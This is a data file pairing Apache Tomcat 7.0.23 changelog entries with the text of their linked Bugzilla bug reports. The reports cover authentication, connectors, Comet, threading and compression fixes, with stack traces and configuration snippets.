Catalina|Tomcat 7.0.23 (markt)|fix|51940|Do not limit saving of request bodies during FORM authentication to POST requests since any HTTP method may include a request body. Based on a patch by Nicholas Sushkin. (markt/kkolinko)|Form Authentication Valve should restore request body on PUT method|"In Tomcat 6 (and 7), Form Authentication valve restores the original request after a POST with successful authentication and redirect is followed by the client's GET. In case of the POST, the valve also restores the original request's body. However, it doesn't do that for a PUT. To be consistent, Tomcat should restore the body on PUT as well.

The patch would be in FormAuthenticator.restoreRequest(Request, Session) [1], to change from

if (""POST"".equalsIgnoreCase(saved.getMethod())) {

to

if (""POST"".equalsIgnoreCase(saved.getMethod()) ||
""PUT"".equalsIgnoreCase(saved.getMethod())
) {

[1] http://svn.apache.org/viewvc/tomcat/tc6.0.x/trunk/java/org/apache/catalina/authenticator/FormAuthenticator.java?view=markup#l450


Maybe related to Bug #48692.


This issue was discussed on users mailing list archived at

http://markmail.org/thread/klafrhln32v3zcau

and

http://mail-archives.apache.org/mod_mbox/tomcat-users/201109.mbox/%3C3052451.ZX31eH6Cz8@strela%3E


Regarding ""Re: Should Form Authentication Valve restore request body on a PUT?"", 
on Thursday, September 29, 2011 17:04:27,
Christopher Schultz wrote to Tomcat Users List <users@tomcat.apache.org>

> ...
> The servlet spec (v3.0, SRV 13.6.3.1) has this to say:
> ""
> If the form based login is invoked because of an HTTP request, the
> original request parameters must be preserved by the container for use
> if, on successful authentication, it redirects the call to the
> requested resource.
> ""
> 
> It doesn't say what kinds of HTTP verbs should or should not be
> supported, but GET and PUT seem entirely obvious. It doesn't say that
> the request body needs to be maintained, only the ""request
> parameters"". Since the servlet specification doesn't have any
> provisions for fetching request parameters from PUT operations, I
> suppose the spec therefore doesn't directly recommend that PUT bodies
> be stored for later use like when POST is used.
> ...
> On the face of it, that seems reasonable. I haven't read-through the
> code that then replays the saved-request so I'm not sure if there's
> more to be done.


Regarding ""Re: Should Form Authentication Valve restore request body on a PUT?"", 
on Friday, September 30, 2011 13:10:55,
Mark Thomas wrote to Tomcat Users List <users@tomcat.apache.org>

> I'd have no objection so the proposed change.
> 
> Mark"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51940
Catalina|Tomcat 7.0.23 (markt)|fix|51956|RemoteAddrFilter used getRemoteHost instead of getRemoteAddr when filtering Comet events. (schultz)|RemoteAddrFilter uses remote host (not address) in doFilterEvent|"public void doFilterEvent(CometEvent event, CometFilterChain chain)
            throws IOException, ServletException {
        processCometEvent(event.getHttpServletRequest().getRemoteHost(),
                event, chain);        
    }

Use of getRemoteHost should be getRemoteAddr."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51956
Catalina|Tomcat 7.0.23 (markt)|fix|51952|Make the inclusion of a response body with a redirect response introduced to address 41718 optional and disabled by default due to the side-effects of including a body with the response in this case. (markt)|IllegalStateException using CompressionFilter with Tomcat 7.0.21/22|"Created attachment 27685 [details]
Simple test to recreate CompressionFilter causing IllegalStateException

Using Tomcat 7.0.21 or 7.0.22 with jdk1.6.0_26 on Solaris 10, mod_ajp and Apache 2.2.21, we get the following logged exception when a sendRedirect is used in a jsp and the CompressionFilter is enabled.

It does not occur using 7.0.20.

I've attached a gzipped tar file containing a simple test that reproduces the problem. test.jsp just contains a sendRedirect to test2.jsp and I've included the source code for the CompressionFilter and a simple web.xml file with this filter's entry. Hitting test.jsp logs the exception below.

SEVERE: Servlet.service() for servlet [jsp] in context with path [] threw exception [java.lang.IllegalStateException: getWriter() has already been called for this response] with root cause
java.lang.IllegalStateException: getWriter() has already been called for this response
        at org.apache.catalina.connector.Response.getOutputStream(Response.java:594)
        at org.apache.catalina.connector.ResponseFacade.getOutputStream(ResponseFacade.java:199)
        at com.tirerack.filters.CompressionResponseStream.<init>(CompressionResponseStream.java:47)
        at com.tirerack.filters.CompressionServletResponseWrapper.createOutputStream(CompressionServletResponseWrapper.java:172)
        at com.tirerack.filters.CompressionServletResponseWrapper.getWriter(CompressionServletResponseWrapper.java:250)
        at org.apache.jasper.runtime.JspWriterImpl.initOut(JspWriterImpl.java:125)
        at org.apache.jasper.runtime.JspWriterImpl.flushBuffer(JspWriterImpl.java:118)
        at org.apache.jasper.runtime.PageContextImpl.release(PageContextImpl.java:190)
        at org.apache.jasper.runtime.JspFactoryImpl.internalReleasePageContext(JspFactoryImpl.java:123)
        at org.apache.jasper.runtime.JspFactoryImpl.releasePageContext(JspFactoryImpl.java:80)
        at org.apache.jsp.test_jsp._jspService(test_jsp.java:74)
        at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:433)
        at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:389)
        at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:333)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:304)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at com.tirerack.filters.CompressionFilter.doFilter(CompressionFilter.java:194)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:224)
        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169)
        at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
        at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:929)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:405)
        at org.apache.coyote.ajp.AjpProcessor.process(AjpProcessor.java:200)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:515)
        at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:302)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51952
Catalina|Tomcat 7.0.23 (markt)|fix|51972|Correctly handle protocol relative URLs when used with sendRedirect(). (markt)|sendRedirect does not support protocol relative URLs|"The following URL is a protocol relative URL: ""//server.com:8080/foo/bar/kala.html""
where as this is server relative: ""/foo/bar/kala.html""

org/apache/catalina/connector/Response.java breaks on protocol relative URLs in that toAbsolute(String) expects everything that begins with a '/' to be server relative. toAbsolute adds the protocol, server and port to the URL, resulting in URLs like http://foo.com:80//server.com:8080/foo/bar/kala.html (instead of the correct http://server.com:8080/foo/bar/kala.html)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51972
Catalina|Tomcat 7.0.23 (markt)|code||Simplify the deployment code and use full paths in log messages to remove any ambiguity in where a context is being deployed from. (markt)|||
Catalina|Tomcat 7.0.23 (markt)|fix|52009|Fix a NPE during access log entry recording when an error occurred during the processing of a Comet request. (markt)|NPE exception in org.apache.catalina.connector.CoyoteAdapter.service|"1. I copied activemq-all-5.4.2.jar, commons-logging-1.1.jar to tomcat lib folder
2. Edit tomcat-user.xml, context.xml, server.xml as below:

Changes  in server.xml:

<Resource  name=""jms/broker"" auth=""Container"" 
        type=""org.apache.activemq.ActiveMQConnectionFactory"" description=""JMS Connection Factory""
        factory=""org.apache.activemq.jndi.JNDIReferenceFactory"" brokerURL=""tcp://localhost:61616"" brokerName=""ActiveMQBroker"" useEmbeddedBroker=""false"" />
        
    <Resource name=""jms/topic/MyTopic"" auth=""Container"" type=""org.apache.activemq.command.ActiveMQTopic"" factory=""org.apache.activemq.jndi.JNDIReferenceFactory"" physicalName=""APP.JMS.TOPIC"" />

<Resource name=""jms/queue/MyQueue"" auth=""Container"" type=""org.apache.activemq.command.ActiveMQQueue"" factory=""org.apache.activemq.jndi.JNDIReferenceFactory"" physicalName=""APP.JMS.QUEUE"" />


<Connector acceptorThreadPriority=""1"" allowTrace=""true"" asyncTimeout=""10000"" connectionLinger=""25"" connectionTimeout=""60000"" name=""NIOConnector"" pollerThreadPriority=""1"" port=""8888"" protocol=""org.apache.coyote.http11.Http11NioProtocol"" redirectPort=""8443"" tcpNoDelay=""false""/>

Changes in context.xml

<ResourceLink global=""jms/broker"" name=""jms/broker"" type=""javax.jms.ConnectionFactory""/>
<ResourceLink global=""jms/topic/MyTopic"" name=""jms/topic/MyTopic"" type=""javax.jms.Topic""/>
<ResourceLink global=""jms/queue/MyQueue"" name=""jms/queue/MyQueue"" type=""javax.jms.Queue""/>

You can also get these file from attached zip

Then access
http://localhost:8080/manager/text/resources, got three JMS resource i defined 

OK - Listed global resources of all types
jms/topic/MyTopic:org.apache.activemq.command.ActiveMQTopic
jms/queue/MyQueue:org.apache.activemq.command.ActiveMQQueue
jms/broker:org.apache.activemq.ActiveMQConnectionFactory
UserDatabase:org.apache.catalina.users.MemoryUserDatabase

3. Start apache-activemq-5.4.2, create topic APP.JMS.TOPIC, and queque: APP.JMS.QUEUE

4. Put sample files QuoteStreamerApp.war as attached in webapp folder, then it will report errors, but if don't define NIO connector, this error doesn't exist

2011-10-11 15:53:01 org.apache.catalina.startup.HostConfig checkResources
INFO: Undeploying context [/QuoteStreamerApp]
2011-10-11 15:53:11 org.apache.catalina.startup.HostConfig deployWAR
INFO: Deploying web application archive QuoteStreamerApp.war
2011-10-11 15:53:52 com.ibm.websphere.webmsg.quotestreamer.AppInit init
INFO: DataSimulator successfully created and set and started.
2011-10-11 15:54:01 com.ibm.webmsg.example.StockServlet setProperties
INFO: Configured properties for quote streamer requests.
2011-10-11 15:54:02 com.ibm.webmsg.example.StockServlet registerURL
INFO: Registered the URL for comet requests.
2011-10-11 15:54:02 org.apache.coyote.http11.AbstractHttp11Processor process
SEVERE: Error processing request
java.lang.NullPointerException
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:436)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:970)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:515)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1550)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)
2011-10-11 15:54:02 org.apache.coyote.http11.AbstractHttp11Processor process
SEVERE: Error processing request
java.lang.NullPointerException
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:436)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:970)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:515)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1550)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)
2011-10-11 15:54:04 org.apache.coyote.http11.AbstractHttp11Processor process
SEVERE: Error processing request
java.lang.NullPointerException
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:436)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:970)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:515)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1550)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)
2011-10-11 15:54:04 org.apache.coyote.http11.AbstractHttp11Processor process
SEVERE: Error processing request
java.lang.NullPointerException
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:436)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:970)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:515)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1550)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52009
Catalina|Tomcat 7.0.23 (markt)|fix||In OneLineFormatter log formatter in JULI always use the US locale to format the date (esp. the month names). (rjung)|||
Catalina|Tomcat 7.0.23 (markt)|add||Cache the results of parsing the global and host level web.xml files to improve web application start time. (markt)|||
Catalina|Tomcat 7.0.23 (markt)|fix|52042|Correct threading issue in annotation caching that could lead to an NPE if multiple threads were processing the same class hierarchy for annotations. (markt)|Possible NullPointerException in DefaultInstanceManager#processAnnotations|"NullPointerException exception is thrown randomly from ""DefaultInstanceManager#processAnnotations"" method on the following lines,

 List<AnnotationCacheEntry> annotations;
            synchronized (annotationCache) {
                annotations = annotationCache.get(clazz).get();
            }

            //Null Pointer Exception is thrown, because annotations is NULL
            for (AnnotationCacheEntry entry : annotations) {


For example, I have a JSF Managed Bean 

public class X extends Y{
}

Open JSF page that contains managed bean X. Randomly opening the same page throws NullPointerException because for superclass Y ""annotations = annotationCache.get(clazz).get();"" returns null.

Using WeakHashMap on ""annotationCache"" field may be the reason of exception."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52042
Catalina|Tomcat 7.0.23 (markt)|fix||Correct additional threading and premature clearance issues with the annotation cache. (markt)|||
Catalina|Tomcat 7.0.23 (markt)|fix||Correct a regression in the fix for 49779 that parameters POSTed by an unauthenticated user to a page that required FORM authentication were lost during the authentication process. (markt)|501 Method not implemented with successive POST requests|"Created attachment 25911 [details]
client wire/context log, client code, webapp code

An unexpected HTTP 501 occurs if using HttpComponents with successive POST requests against a simple Tomcat 7 servlet (Form-based POST Authentication is enabled). After a sucessfull authentication, the client requests the same protected resource a few times in a row, but the second request always returns a ""501 Method not implemented"" status. All other requests succeed.

The following communication takes place:
1. Client requests a protected resource; Tomcat returns the login page (HTTP200)
2. Client provides the user credentials and calls the login resource; Tomcat returns a redirect (HTTP302)
3. Client sets the location from the redirect for the next request(identical to URI from #1) and requests it; Tomcat returns the page (HTTP200)
4. Client requests the same resource again; Tomcat returns a HTTP501 - Method not implemented
5. Client requests the same resource again; Tomcat returns the page (HTTP200)
6. Client requests the same resource again; Tomcat returns the page (HTTP200)
7. Client requests the same resource again; Tomcat returns the page (HTTP200)

The access log message regarding the 501 says:
'""testName=testValuePOST /test/secure/ HTTP/1.1"" 501 1278', which may indicate that the entity data and the HTTP-method name somehow got mixed up!? Strangely the HTTP501 does not appear in case of a JSP for the requested resource, only if facing a form-based POST authentication Servlet. The servlet does only implement post and get(which calls the doPost) and returns just a string. The client code should be fine since I already posted this issue on the HTTPComponents mailing list and the data sent over the wire seems to be right. 

I attached the source/bin of the testclient and webapp and also the wire/context log of the client.

How can I provide further helpfull information?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49779
Catalina|Tomcat 7.0.23 (markt)|fix|52055|Ensure that the input and output buffers are correctly reset between keep-alive requests when using Servlet 3.0 asynchronous request processing. (markt)|ChunkedInputFilter is not recycled for servlet 3.0 asynchronous request|"I'm using the standard servlet 3.0 async APIs with tomcat 7.0.22. The server side code is something like the following:

        final AsyncContext asyncContext = request.startAsync();

        ... // in a processing thread
        asyncContext.getRequest().getInputStream();
        ... read the input stream
        asyncContext.complete();

The InputStream returns 0 bytes for the HTTP post with chunking. 

After debugging, I found that the ChunkedInputFilter is reused by org.apache.coyote.http11.AbstractInputBuffer. But it has never been recycled (nextRequest()?) before the reuse for another request. As a result, the endChunk flag is always true after the first request. And it always return immediately without reading more from the buffer."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52055
Catalina|Tomcat 7.0.23 (markt)|fix||Ensure changes to the configuration of the RemoteHostValve and the RemoteAddrValve via JMX are thread-safe. (markt)|||
Catalina|Tomcat 7.0.23 (markt)|fix||Ensure that the memory leak protection for the HttpClient keep-alive always operates even if the thread has already stopped. (markt)|||
Catalina|Tomcat 7.0.23 (markt)|code||Remove the Java 1.2 specific error handling around the adding of the shutdown hook. (markt)|||
Catalina|Tomcat 7.0.23 (markt)|fix||Correct errors in i18n resources and resource usage that meant some messages were either not used or were incorrectly formatted. (markt)|||
Catalina|Tomcat 7.0.23 (markt)|code||Replace the use of deprecated auth method names from authenticator.Constants with the auth method names from HttpServletRequest. (kkolinko)|||
Catalina|Tomcat 7.0.23 (markt)|add||Make configuration issues for security related Valves and Filters result in the failure of the valve or filter rather than just a warning message. (markt)|||
Catalina|Tomcat 7.0.23 (markt)|add||Improve performance of parameter processing for GET and POST requests. Also add an option to limit the maximum number of parameters processed per request. This defaults to 10000. Excessive parameters are ignored. Note that FailedRequestFilter can be used to reject the request if some parameters were ignored. (markt/kkolinko)|||
Catalina|Tomcat 7.0.23 (markt)|fix|52091|Address performance issues related to lock contention in StandardWrapper. Patch provided by Taiki Sugawara. (markt)|TagHandlerPool is slow when high concurrently|"TagHandlerPool is slow when I ran stress test my web application using tomcat7.
It occured in 7.0.19.
Profiler said that it causes are followings:

 1. Lock of log instance at org.apache.jasper.runtime.TagHandlerPool.

 2. Lock of parameters field at org.apache.catalina.core.StandardWrapper.getInitParameter.

An attached patch resolve this issue in my environment.
It makes following changes:

 1. Makes log field to static.

 2. At StandardWrapper, changes lock policy from synchronized block to ReentrantReadWriteLock."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52091
Catalina|Tomcat 7.0.23 (markt)|code||Switch to using Collections.enumeration() rather than custom code that does the same thing. (markt)|||
Catalina|Tomcat 7.0.23 (markt)|fix|52113|Don't assume presence of context.xml file with JMX deployment. (markt)|Tomcat reports missing context xml at wrong location on JMX deployment|"Hello, 

I'm using Tomcat JMX interface to deploy apps as follows:
1) call MBeanFactory#createStandardContext, where MBeanFactory is ""Catalina:type=MBeanFactory"", with parameters: parent = ""Catalina:type=Host,host=localhost"", path = ""/w1"", docBase = <my path to the app>
2) call <my app>#start, where <my app> is ""Catalina:j2eeType=WebModule,name=//localhost/w1,J2EEApplication=none,J2EEServer=none""

As result, my app _is succesfully deployed (its context is available)_, but nevertheless I see the following exceptions in the server console (full stacktraces are skipped, to be attached next comment):

31 ???? 2011 14:05:53 org.apache.catalina.startup.ContextConfig
processContextConfig
SEVERE: Missing context.xml: file:/C:/<my Tomcat base
folder>/conf/Catalina/localhost/w1.xml
java.io.FileNotFoundException: C:\<my Tomcat base
folder>\conf\Catalina\localhost\w1.xml

31 ???? 2011 14:05:53 org.apache.catalina.startup.ContextConfig
processContextConfig
SEVERE: Parse error in context.xml for /w1
java.io.FileNotFoundException: C:\<my Tomcat base
folder>\conf\Catalina\localhost\w1.xml

31 ???? 2011 14:05:53 org.apache.catalina.startup.ContextConfig configureStart
SEVERE: Marking this application unavailable due to previous error(s)

31 ???? 2011 14:05:53 org.apache.catalina.core.StandardContext startInternal
SEVERE: Error getConfigured

31 ???? 2011 14:05:53 org.apache.catalina.core.StandardContext startInternal
SEVERE: Context [/w1] startup failed due to previous errors

The exceptions looks strange to me, since I don't understand why Tomcat searches for a context xml file during the jmx deploy.

Do I do something wrong in the deployment workflow?

Regards, 
Michael"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52113
Catalina|Tomcat 7.0.23 (markt)|update||In RequestFilterValve (RemoteAddrValve, RemoteHostValve): refactor value matching logic into separate method and expose this new method isAllowed through JMX. (kkolinko)|||
Catalina|Tomcat 7.0.23 (markt)|fix|52156|Ensure that getServletContext().getResource(path) returns the correct resource when path contains /../ sequences or any other sequences that require normalization. (markt)|"ServletContext.getResource(path) doesn't accept "".."" anymore"|"With WAR-packaged webapp,
   getServletContext().getResource(""/mydata/../mydata/myfile.txt"")
should return the same URL as
   getServletContext().getResource(""/mydata/myfile.txt"")
but returns NULL instead.

It's ok for folder-based webapp.
It was working in Tomcat 6.0.20.
It looks like Bug 10629 (WARDirContext.java regression?)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52156
Catalina|Tomcat 7.0.23 (markt)|add||Report existence of HTTP request parameter parsing errors via new special ServletRequest attribute, org.apache.catalina.parameter_parse_failed. (kkolinko)|||
Catalina|Tomcat 7.0.23 (markt)|add||New filter FailedRequestFilter that will reject a request if there were errors during HTTP parameter parsing. (kkolinko)|||
Catalina|Tomcat 7.0.23 (markt)|update||Improve special attributes handling in Request object by using hash table lookup instead of series of string comparisons. (kkolinko)|||
Catalina|Tomcat 7.0.23 (markt)|code||Deprecate unused methods in IntrospectionUtils class. (kkolinko)|||
Catalina|Tomcat 7.0.23 (markt)|fix||Improve processing of errors that are wrapped in InvocationTargetException. Rethrow fatal errors that must be rethrown. (kkolinko)|||
Catalina|Tomcat 7.0.23 (markt)|fix||Improve handling of failed web application deployments during automatic deployment. Once deployment of a web application fails in one form (e.g. WAR), no further attempt (e.g. directory) will be made to deploy that web application. The base Lifecycle implementation has been improved to allow failed web applications to be started once the configuration issues have been resolved. Any changes to a context.xml file (global, per host or web application specific) will now result in a redeploy of the affected web application(s) that ensures that any changes are correctly applied rather than a reload which ignores changes in context.xml files. (markt/kkolinko)|||
Catalina|Tomcat 7.0.23 (markt)|fix|52173|Improve Javadoc for delegate attribute of WebappClassLoader. Based on a patch by bmargulies. (markt)|Add a drop of additional clarification to doc on the delegate setting of the WebappClassLoader|"Created attachment 27931 [details]
javadoc tweaks to WebappClassLoader

There is a full description of the 'delegate' flag on the protected boolean member, but programmers using the class are likely to look to the setDelegate function for enlightenment. Further, the IMPLEMENTATION NOTE at the top does
not mention the existence of the delegate flag.

This patch tries to makes it harder to misunderstand, since the term 'delegate' has, to me at least, a bit of ambiguity to it."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52173
Catalina|Tomcat 7.0.23 (markt)|add||Add denyStatus attribute to RequestFilterValve (RemoteAddrValve, RemoteHostValve valves) and RequestFilter (RemoteAddrFilter, RemoteHostFilter filters). It allows to use different HTTP response code when rejecting denied request. E.g. 404 instead of 403. (kkolinko)|||
Catalina|Tomcat 7.0.23 (markt)|fix||Slightly improve performance of UDecoder.convert(). Align %2f handling between implementations. (kkolinko)|||
Coyote|Tomcat 7.0.23 (markt)|fix|51881|Correctly complete Comet requests when the Comet END event is triggered asynchronously. (markt)|Server incorrectly parses incoming HTTP requests and loses them|"We are developing Comet-based web application with native Tomcat Comet support via Atmosphere framework. We use HTTP streaming for transferring data from our servlet to the client. In our scenario, the user connects to the server with XMLHTTPRequest sending GET. In response, we suspend his connection and then, when needed, send data back to him. When the user opens another browser tab and connects to our web application, our web application should close the connection in the first (previously opened) tab and then suspend and use connection from the second. So, my serlvet detect that another GET is incoming in the same session, finds previous connection and closes it (internally using CometEvent.close()). This works as intended. However, the next HTTP request to the web server is not correctly handled, and in my servlet I receive the strange HttpServletRequest with previous GET query string and duplicate request headers from initial GET and the following request. I traced through the Tomcat code, and noticed, that in org.apache.coyote.http11.Http11Processor.process() request field is usually empty (contains no HTTP method, request headers, etc.) However, after Comet closing this object is not empty and contain previoud HTTP request. Later the request headers are parsed and appended to the fields existed in previous request object. After that, this invalid object is passed to my Servlet.
I suppose, that clearing request object when closing comet event and all assosiated data in Http11NioProcessor.actionInternal() can solve this issue."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51881
Coyote|Tomcat 7.0.23 (markt)|fix|51905|Fix infinite loop in AprEndpoint shutdown if acceptor unlock fails. Reduce timeout before forcefully closing the socket from 30s to 10s. (kkolinko)|Infinite loop when shutting down AprEndpoint|"If unlocking the acceptor during AprEndpoint shutdown fails, it enters an infinite loop, printing endpoint.warn.unlockAcceptorFailed message
(Acceptor thread [{0}] failed to unlock. Forcing hard socket shutdown.)

It was reported on users@ mailing lists,
http://tomcat.markmail.org/thread/xo2jolyr44ijuu34

It might be caused by a firewall preventing Tomcat from connecting to its own HTTP port.

I can reproduce it if I turn the unlockAccept() method in endpoint into an noop (e.g. by adding ""if(true){ return; }""), both in 6.0 and in trunk. In 6.0 this bug was introduced in r1065945 and affects 6.0.32 and 6.0.33."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51905
Coyote|Tomcat 7.0.23 (markt)|fix|51912|Fix HTTP header processing in NIO HTTP connector. (kkolinko)|IOOB exception in InternalNioInputBuffer when debug logging is enabled|"I encountered the following while testing 7.0.22 RC.

To reproduce:
1. Replace conf/logging.properties with the following:
===============
handlers = 1catalina.org.apache.juli.FileHandler
.handlers = 1catalina.org.apache.juli.FileHandler

1catalina.org.apache.juli.FileHandler.level = FINE
1catalina.org.apache.juli.FileHandler.directory = ${catalina.base}/logs
1catalina.org.apache.juli.FileHandler.prefix = catalina.
1catalina.org.apache.juli.FileHandler.bufferSize=20000

.level=FINE
===============
Note that level=FINE enables debug logging.

2. Run testsuite for NIO + org.apache.coyote.http11.TestInternalInputBuffer
by adding the following to build.properties:
execute.test.bio=false
execute.test.nio=true
execute.test.apr=false
test.entry=org.apache.coyote.http11.TestInternalInputBuffer

3. The test fails:
==============
Testsuite: org.apache.coyote.http11.TestInternalInputBuffer
Tests run: 7, Failures: 2, Errors: 0, Time elapsed: 50,357 sec

Testcase: testBug48839 took 9,594 sec
Testcase: testBug51557NoColon took 1,217 sec
	FAILED

junit.framework.AssertionFailedError: 
	at org.apache.coyote.http11.TestInternalInputBuffer.testBug51557NoColon(TestInternalInputBuffer.java:137)

Testcase: testBug51557Separators took 22,807 sec
Testcase: testBug51557Ctl took 13,104 sec
	FAILED

junit.framework.AssertionFailedError: 
	at org.apache.coyote.http11.TestInternalInputBuffer.doTestBug51557Char(TestInternalInputBuffer.java:216)
	at org.apache.coyote.http11.TestInternalInputBuffer.testBug51557Ctl(TestInternalInputBuffer.java:160)

Testcase: testBug51557Continuation took 1,248 sec
Testcase: testBug51557BoundaryStart took 1,185 sec
Testcase: testBug51557BoundaryEnd took 1,186 sec
==============

4. It is the only test in testsuite that is failing in this logging configuration. The rest of testsuite did run successfully.
This test also succeeds when it is run with BIO or APR. Only NIO fails.


In the log file the following exception occurs 3 times:
==============
28.09.2011 17:50:38 org.apache.coyote.http11.AbstractHttp11Processor process
FINE: Error parsing HTTP request header
java.lang.StringIndexOutOfBoundsException: String index out of range: -40
	at java.lang.String.checkBounds(String.java:397)
	at java.lang.String.<init>(String.java:482)
	at org.apache.coyote.http11.InternalNioInputBuffer.skipLine(InternalNioInputBuffer.java:672)
	at org.apache.coyote.http11.InternalNioInputBuffer.parseHeader(InternalNioInputBuffer.java:526)
	at org.apache.coyote.http11.InternalNioInputBuffer.parseHeaders(InternalNioInputBuffer.java:435)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:905)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:515)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1550)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)
==============

It is caused by debug logging in
org.apache.coyote.http11.InternalNioInputBuffer.skipLine(InternalNioInputBuffer.java:672)

671        if (log.isDebugEnabled()) {
672            log.debug(sm.getString(""iib.invalidheader"", new String(buf,
673                    headerData.start,
674                    headerData.lastSignificantChar - headerData.start + 1,
675                    DEFAULT_CHARSET)));
676        }

InternalInputBuffer and InternalAprInputBuffer have similar debug logging in their skipLine() methods, but they do not fail."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51912
Coyote|Tomcat 7.0.23 (markt)|fix||Improve MimeHeaders.toString(). (kkolinko)|||
Coyote|Tomcat 7.0.23 (markt)|fix||Fix threading issue in NIO connectors during shutdown that meant Comet connections were not always shut down cleanly. (markt)|||
Coyote|Tomcat 7.0.23 (markt)|add||In HTTP connectors: self-guard against using a non-recycled input buffer. Requests will be rejected with response status 400. (kkolinko)|||
Coyote|Tomcat 7.0.23 (markt)|fix|52121|Fix possible output corruption when compression is enabled for a connector and the response is flushed. Includes a test case provided by David Marcks. (kkolinko/markt)|corrupt gzip output when compression=on in server.xml|"Created attachment 27886 [details]
Gzip Corruption Repro WAR

This appears to be same issue as posted by Christopher Taylor
Jun 30, 2011 at 8:05 am to Tomcat Users. The subject line has been preserved above.

As mentioned in the post, this seems to have arisen with this issue:
https://issues.apache.org/bugzilla/show_bug.cgi?id=48738

The change introduced this class: FlushableGZIPOutputStream. When we started using this, we noticed that certain string flush sequences would result in corrupt gzip output. 

The attached WAR provides a repro. The sequence of writes to the output stream that would‚Äôve been done by our server is mimicked in this case using a file system. There are 40 files each representing a flush. URL:

""http://localhost:8080/TomcatBugReportWAR""

I‚Äôve allowed the ‚Äòstart‚Äô and ‚Äòend‚Äô request parameters to control to the starting and ending points. I‚Äôve also allowed an ‚Äòappend‚Äô request parameter dump anything to the outputstream.

The defaults are 0, 40, and ‚Äú‚Äù for start end and append respectively.

